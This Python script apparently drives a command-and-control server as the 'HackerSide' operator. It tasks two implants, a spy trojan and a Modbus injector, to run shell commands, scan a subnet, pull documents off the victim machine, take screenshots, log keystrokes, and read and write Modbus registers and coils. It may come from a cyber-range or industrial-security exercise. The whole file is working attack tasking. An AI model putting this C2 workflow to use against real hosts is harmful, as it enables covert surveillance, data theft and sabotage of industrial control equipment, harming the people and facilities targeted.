import time 
import c2Client

ownID = 'HackerSide'
client = c2Client(ownID, '10.10.0.165', c2Port=5000)

taskInt = 100 # interval to assign task.

malware1id = 'spyTrojan01'
malware2id = 'ModbusInjector'

# spy task
time.sleep(taskInt)
result = client.getLastRst(malwareID=malware1id)
print(result)
testTaskJson = {
            'taskType'  : c2Client.CMD_FLG,
            'startT'    : None,
            'repeat'    : 1,
            'exePreT'   : 0,
            'state'     : c2Client.TASK_P_FLG,
            'taskData'  : ['ipconfig']
        }

client.postTask(malware1id, testTaskJson)

# FDI task
time.sleep(taskInt)
result = client.getLastRst(malwareID=malware2id)
print(result)
testTaskJson = {
            'taskType'  : c2Client.CMD_FLG,
            'startT'    : None,
            'repeat'    : 1,
            'exePreT'   : 0,
            'state'     : c2Client.TASK_P_FLG,
            'taskData'  : ['ipconfig']
        }

client.postTask(malware2id, testTaskJson)

# FDI task
time.sleep(taskInt)
result = client.getLastRst(malwareID=malware2id)
print(result)
testTaskJson = {
            'taskType'  : c2Client.CMD_FLG,
            'startT'    : None,
            'repeat'    : 1,
            'exePreT'   : 0,
            'state'     : c2Client.TASK_P_FLG,
            'taskData'  : ['dir']
        }

client.postTask(malware2id, testTaskJson)

# spy task
time.sleep(taskInt)
result = client.getLastRst(malwareID=malware1id)
print(result)
testTaskJson = {
            'taskType'  : "scanSubnet",
            'startT'    : None,
            'repeat'    : 1,
            'exePreT'   : 0,
            'state'     : c2Client.TASK_P_FLG,
            'taskData'  : "10.10.0.0/24"
        }

client.postTask(malware1id, testTaskJson)

# spy task
time.sleep(taskInt)
result = client.getLastRst(malwareID=malware1id)
print(result)
testTaskJson = {
            'taskType'  : c2Client.UPLOAD_FLG,
            'startT'    : None,
            'repeat'    : 1,
            'exePreT'   : 0,
            'state'     : c2Client.TASK_P_FLG,
            'taskData'  : ['C:\\Works\\Report.pptx', 'C:\\Works\\pic.png']
        }

client.postTask(malware1id, testTaskJson)

# FDI task
time.sleep(taskInt)
result = client.getLastRst(malwareID=malware2id)
print(result)
testTaskJson = {
            'taskType'  : c2Client.DOWNLOAD_FLG,
            'startT'    : None,
            'repeat'    : 1,
            'exePreT'   : 0,
            'state'     : c2Client.TASK_P_FLG,
            'taskData'  : ['2023-12-13_100327.png']
        }

client.postTask(malware2id, testTaskJson)

# spy task
time.sleep(taskInt)
result = client.getLastRst(malwareID=malware1id)
print(result)
testTaskJson = {
            'taskType'  : c2Client.DOWNLOAD_FLG,
            'startT'    : None,
            'repeat'    : 1,
            'exePreT'   : 0,
            'state'     : c2Client.TASK_P_FLG,
            'taskData'  : ['NCL_SGX Service.docx']
        }

client.postTask(malware1id, testTaskJson)

# spy task
time.sleep(taskInt)
result = client.getLastRst(malwareID=malware1id)
print(result)
testTaskJson = {
            'taskType'  : c2Client.CMD_FLG,
            'startT'    : None,
            'repeat'    : 1,
            'exePreT'   : 0,
            'state'     : c2Client.TASK_P_FLG,
            'taskData'  : ['dir']
        }

client.postTask(malware1id, testTaskJson)

# spy task
time.sleep(taskInt)
result = client.getLastRst(malwareID=malware1id)
print(result)
testTaskJson = {
            'taskType'  : "screenShot",
            'startT'    : None,
            'repeat'    : 1,
            'exePreT'   : 0,
            'state'     : c2Client.TASK_P_FLG,
            'taskData'  : "None"
        }

client.postTask(malware1id, testTaskJson)

# FDI task
time.sleep(taskInt)
result = client.getLastRst(malwareID=malware2id)
print(result)
testTaskJson = {
            'taskType'  : "screenShot",
            'startT'    : None,
            'repeat'    : 1,
            'exePreT'   : 0,
            'state'     : c2Client.TASK_P_FLG,
            'taskData'  : "None"
        }
client.postTask(malware2id, testTaskJson)

# spy task
time.sleep(taskInt)
result = client.getLastRst(malwareID=malware1id)
print(result)
testTaskJson = {
            'taskType'  : c2Client.CMD_FLG,
            'startT'    : None,
            'repeat'    : 1,
            'exePreT'   : 0,
            'state'     : c2Client.TASK_P_FLG,
            'taskData'  : ['echo hello I am a hacker, you comptuer is under my control']
        }

client.postTask(malware1id, testTaskJson)

# FDI task
time.sleep(taskInt)
result = client.getLastRst(malwareID=malware2id)
print(result)
testTaskJson = {
            'taskType'  : c2Client.CMD_FLG,
            'startT'    : None,
            'repeat'    : 1,
            'exePreT'   : 0,
            'state'     : c2Client.TASK_P_FLG,
            'taskData'  : ['echo hello I am a hacker, you comptuer is under my control']
        }
client.postTask(malware2id, testTaskJson)

# spy task
time.sleep(taskInt)
result = client.getLastRst(malwareID=malware1id)
print(result)
testTaskJson = {
            'taskType'  : "keyEvent",
            'startT'    : None,
            'repeat'    : 1,
            'exePreT'   : 0,
            'state'     : c2Client.TASK_P_FLG,
            'taskData'  : "startRcd;10"
        }

client.postTask(malware1id, testTaskJson)

# spy task
time.sleep(taskInt)
result = client.getLastRst(malwareID=malware1id)
print(result)
testTaskJson = {
            'taskType'  : "keyEvent",
            'startT'    : None,
            'repeat'    : 1,
            'exePreT'   : 0,
            'state'     : c2Client.TASK_P_FLG,
            'taskData'  : "getEvent;simple"
        }

client.postTask(malware1id, testTaskJson)

# FDI task
time.sleep(taskInt)
result = client.getLastRst(malwareID=malware2id)
print(result)
testTaskJson = {
            'taskType'  : "modbus",
            'startT'    : None,
            'repeat'    : 1,
            'exePreT'   : 0,
            'state'     : c2Client.TASK_P_FLG,
            'taskData'  : "read;reg;0;4"
        }
client.postTask(malware2id, testTaskJson)

# FDI task
time.sleep(taskInt)
result = client.getLastRst(malwareID=malware2id)
print(result)
testTaskJson = {
            'taskType'  : "modbus",
            'startT'    : None,
            'repeat'    : 1,
            'exePreT'   : 0,
            'state'     : c2Client.TASK_P_FLG,
            'taskData'  : "write;coil;3;1"
        }
client.postTask(malware2id, testTaskJson)